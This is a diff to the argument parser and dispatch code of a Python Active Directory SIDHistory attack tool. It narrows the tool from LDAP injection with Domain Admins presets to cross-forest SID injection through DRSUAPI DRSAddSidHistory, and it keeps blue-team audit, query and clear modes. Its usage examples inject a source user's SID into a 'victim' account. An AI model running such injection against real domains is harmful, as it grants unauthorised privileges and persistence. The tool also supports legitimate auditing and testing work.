@@ -54,38 +54,28 @@ def build_parser():
         formatter_class=argparse.RawDescriptionHelpFormatter,
         epilog="""
 MODES:
-  Attack:  Inject SIDs into sIDHistory (--target + --source-user/--sid/--preset)
+  Inject:  Inject SID via DRSUAPI (--target + --source-user + --source-domain)
   Remove:  Remove SIDs from sIDHistory (--target + --remove/--clear/--clean-same-domain)
   Query:   Query sIDHistory of an object (--query)
   Lookup:  Lookup SID of an object (--lookup)
   Audit:   Full domain sIDHistory audit (--audit)
   Trusts:  Enumerate domain trusts (--enum-trusts)
-  Presets: List available SID presets (--list-presets)
-  Copy:    Copy sIDHistory between objects (--target + --copy-from)
-  Bulk:    Bulk operations from file (--targets-file)
+  Presets: List well-known SID presets (--list-presets)
+  Bulk:    Bulk clear from file (--targets-file + --bulk-clear)
 
-INJECTION METHODS:
-  --method ldap       Direct LDAP modify (default, may be blocked by DC)
-  --method drsuapi    RPC DRSAddSidHistory (cross-forest, requires specific setup)
+INJECTION:
+  Uses DRSUAPI DRSAddSidHistory (opnum 20) — the same RPC call that
+  Microsoft's ADMT uses for domain migrations. Requires cross-forest
+  trust, auditing enabled on both DCs, and source domain credentials.
 
 EXAMPLES:
-  # Inject Domain Admins SID using preset
-  %(prog)s -d CORP.LOCAL -u admin -p Pass123 -dc 10.0.0.1 \\
-      --target victim --preset domain-admins
-
-  # Inject specific SID
-  %(prog)s -d CORP.LOCAL -u admin -p Pass123 -dc 10.0.0.1 \\
-      --target victim --sid S-1-5-21-xxx-512
-
-  # Cross-forest injection via DRSUAPI
+  # Cross-forest SID injection via DRSUAPI
   %(prog)s -d DST.LOCAL -u admin -p Pass123 -dc 10.0.0.1 \\
-      --target victim --source-user admin --source-domain SRC.LOCAL --method drsuapi
+      --target victim --source-user admin --source-domain SRC.LOCAL \\
+      --src-username admin --src-password Pass123 --src-domain SRC.LOCAL
 
   # Full domain audit (blue team)
   %(prog)s -d CORP.LOCAL -u admin -p Pass123 -dc 10.0.0.1 --audit
-
-  # Audit with JSON output
-  %(prog)s -d CORP.LOCAL -u admin -p Pass123 -dc 10.0.0.1 --audit -o json
 
   # Query a user's sIDHistory
   %(prog)s -d CORP.LOCAL -u admin -p Pass123 -dc 10.0.0.1 --query victim
@@ -93,9 +83,9 @@ EXAMPLES:
   # Clear sIDHistory (blue team cleanup)
   %(prog)s -d CORP.LOCAL -u admin -p Pass123 -dc 10.0.0.1 --target victim --clear
 
-  # Bulk inject from file
+  # Bulk clear from file
   %(prog)s -d CORP.LOCAL -u admin -p Pass123 -dc 10.0.0.1 \\
-      --targets-file users.txt --sid S-1-5-21-xxx-512
+      --targets-file users.txt --bulk-clear
         """
     )
 
@@ -134,20 +124,13 @@ EXAMPLES:
 
     # ── Modification options ──
     mods = parser.add_argument_group('Modification options (with --target)')
-    mods.add_argument('--source-user', help='Source user whose SID to inject')
-    mods.add_argument('--source-domain', help='Source domain (cross-domain injection)')
-    mods.add_argument('--sid', help='Specific SID to add/remove')
-    mods.add_argument('--preset', help='Inject a well-known SID preset (e.g., domain-admins)')
-    mods.add_argument('--copy-from', help='Copy sIDHistory from another object')
+    mods.add_argument('--source-user', help='Source user whose SID to inject (via DRSUAPI)')
+    mods.add_argument('--source-domain', help='Source domain (cross-forest injection)')
+    mods.add_argument('--sid', help='SID to remove (use with --remove)')
     mods.add_argument('--remove', action='store_true', help='Remove --sid from sIDHistory')
     mods.add_argument('--clear', action='store_true', help='Clear all sIDHistory')
     mods.add_argument('--clean-same-domain', action='store_true',
                      help='Remove same-domain SIDs only (preserve migration SIDs)')
-
-    # ── Injection method ──
-    method = parser.add_argument_group('Injection method')
-    method.add_argument('--method', choices=['ldap', 'drsuapi'], default='ldap',
-                       help='Injection method (default: ldap)')
 
     # ── Source domain credentials (DRSUAPI cross-forest) ──
     src_creds = parser.add_argument_group('Source domain credentials (for DRSUAPI cross-forest)')
@@ -158,7 +141,7 @@ EXAMPLES:
     # ── Bulk operations ──
     bulk = parser.add_argument_group('Bulk operations')
     bulk.add_argument('--targets-file', help='File with target sAMAccountNames (one per line)')
-    bulk.add_argument('--bulk-clear', action='store_true', help='Clear sIDHistory for all targets in file')
+    bulk.add_argument('--bulk-clear', action='store_true', help='Clear sIDHistory for all targets in file (with --targets-file)')
 
     # ── Output ──
     output = parser.add_argument_group('Output')
@@ -210,26 +193,27 @@ def validate_arguments(args, auth_method: str, parser) -> bool:
 
     # Target action validation
     if args.target:
-        has_action = (args.source_user or args.sid or args.preset or
-                     args.clear or args.copy_from or args.clean_same_domain)
+        has_action = (args.source_user or args.clear or args.clean_same_domain or
+                     (args.remove and args.sid))
         if not has_action and not args.targets_file:
-            parser.error("--target requires --source-user, --sid, --preset, --copy-from, "
-                        "--clear, or --clean-same-domain")
+            parser.error("--target requires --source-user, --clear, --clean-same-domain, "
+                        "or --remove with --sid")
 
         if args.remove and not args.sid:
             parser.error("--remove requires --sid")
 
-    # DRSUAPI method requires --source-user (DRSAddSidHistory needs SrcPrincipal/SrcDomain)
-    if hasattr(args, 'method') and args.method == 'drsuapi' and args.target:
-        if not args.source_user:
-            parser.error("--method drsuapi requires --source-user (and optionally --source-domain).\n"
-                        "  DRSAddSidHistory copies a source principal's SID, it cannot inject arbitrary SIDs.\n"
-                        "  Use --method ldap for --sid/--preset injection, or specify --source-user.")
+        if args.sid and not args.remove:
+            parser.error("--sid is only used with --remove (LDAP injection of arbitrary SIDs "
+                        "is blocked by the DC's SAM layer)")
+
+        # Injection requires --source-domain for cross-forest DRSUAPI
+        if args.source_user and not args.source_domain:
+            parser.error("--source-user requires --source-domain (DRSAddSidHistory is cross-forest only)")
 
     # Bulk validation
     if args.targets_file:
-        if not (args.sid or args.preset or args.bulk_clear):
-            parser.error("--targets-file requires --sid, --preset, or --bulk-clear")
+        if not args.bulk_clear:
+            parser.error("--targets-file requires --bulk-clear")
 
     return True
 
@@ -332,47 +316,28 @@ def handle_target(attacker: SIDHistoryAttack, formatter: OutputFormatter,
             print(f"\n[+] Removed SID from {target}")
         return success
 
-    # Copy from another object
-    if args.copy_from:
+    # Injection via DRSUAPI (cross-forest)
+    if args.source_user:
         if dry_run:
-            source_hist = attacker.get_current_sid_history(args.copy_from)
-            print(f"[DRY-RUN] Would copy {len(source_hist)} SIDs from {args.copy_from} to {target}:")
-            for s in source_hist:
-                print(f"  {s}")
+            source_sid = attacker.get_user_sid(args.source_user)
+            print(f"[DRY-RUN] Would inject SID of {args.source_user}@{args.source_domain} into {target}")
+            if source_sid:
+                print(f"[DRY-RUN] Source SID: {source_sid}")
+            print(f"[DRY-RUN] Method: DRSUAPI (DRSAddSidHistory opnum 20)")
             return True
-        success = attacker.copy_sid_history(args.copy_from, target)
-        if success:
-            print(f"\n[+] Copied sIDHistory from {args.copy_from} to {target}")
-        return success
 
-    # Injection
-    if dry_run:
-        sid = _resolve_injection_sid(attacker, args)
-        if sid:
-            name = SIDConverter.resolve_sid_name(sid, attacker.get_domain_sid())
-            print(f"[DRY-RUN] Would inject SID {sid} ({name}) into {target}")
-            print(f"[DRY-RUN] Method: {args.method}")
-        return True
-
-    if args.preset:
-        success = attacker.add_sid_preset(target, args.preset, method=args.method)
-    elif args.source_user:
-        # Source domain credentials for DRSUAPI cross-forest
         src_creds_user = getattr(args, 'src_username', '') or ''
         src_creds_password = getattr(args, 'src_password', '') or ''
         src_creds_domain = getattr(args, 'src_domain', '') or args.source_domain or ''
         success = attacker.inject_sid_history(
             target, args.source_user,
             source_domain=args.source_domain,
-            method=args.method,
             src_creds_user=src_creds_user,
             src_creds_domain=src_creds_domain,
             src_creds_password=src_creds_password,
         )
-    elif args.sid:
-        success = attacker.add_sid_to_history(target, args.sid, method=args.method)
     else:
-        logging.error("No injection source specified")
+        logging.error("No action specified")
         return False
 
     if success:
@@ -387,7 +352,7 @@ def handle_target(attacker: SIDHistoryAttack, formatter: OutputFormatter,
 
 
 def handle_bulk(attacker: SIDHistoryAttack, args, dry_run: bool = False) -> bool:
-    """Handle --targets-file bulk operations."""
+    """Handle --targets-file bulk operations (bulk-clear only)."""
     try:
         with open(args.targets_file, 'r') as f:
             targets = [line.strip() for line in f if line.strip() and not line.startswith('#')]
@@ -397,28 +362,11 @@ def handle_bulk(attacker: SIDHistoryAttack, args, dry_run: bool = False) -> bool
 
     logging.info(f"Loaded {len(targets)} targets from {args.targets_file}")
 
-    if args.bulk_clear:
-        if dry_run:
-            print(f"[DRY-RUN] Would clear sIDHistory for {len(targets)} objects")
-            return True
-        results = attacker.bulk_clear(targets)
-    else:
-        sid = None
-        if args.sid:
-            sid = args.sid
-        elif args.preset:
-            sid = attacker.resolve_preset(args.preset)
+    if dry_run:
+        print(f"[DRY-RUN] Would clear sIDHistory for {len(targets)} objects")
+        return True
 
-        if not sid:
-            logging.error("No SID to inject (use --sid or --preset)")
-            return False
-
-        if dry_run:
-            name = SIDConverter.resolve_sid_name(sid, attacker.get_domain_sid())
-            print(f"[DRY-RUN] Would inject {sid} ({name}) into {len(targets)} objects")
-            return True
-
-        results = attacker.bulk_inject(targets, sid)
+    results = attacker.bulk_clear(targets)
 
     # Report results
     success_count = sum(1 for v in results.values() if v)
@@ -432,17 +380,6 @@ def handle_bulk(attacker: SIDHistoryAttack, args, dry_run: bool = False) -> bool
                 print(f"  - {target}")
 
     return fail_count == 0
-
-
-def _resolve_injection_sid(attacker: SIDHistoryAttack, args) -> Optional[str]:
-    """Resolve what SID would be injected based on args."""
-    if args.sid:
-        return args.sid
-    elif args.preset:
-        return attacker.resolve_preset(args.preset)
-    elif args.source_user:
-        return attacker.get_user_sid(args.source_user)
-    return None
 
 
 def main():
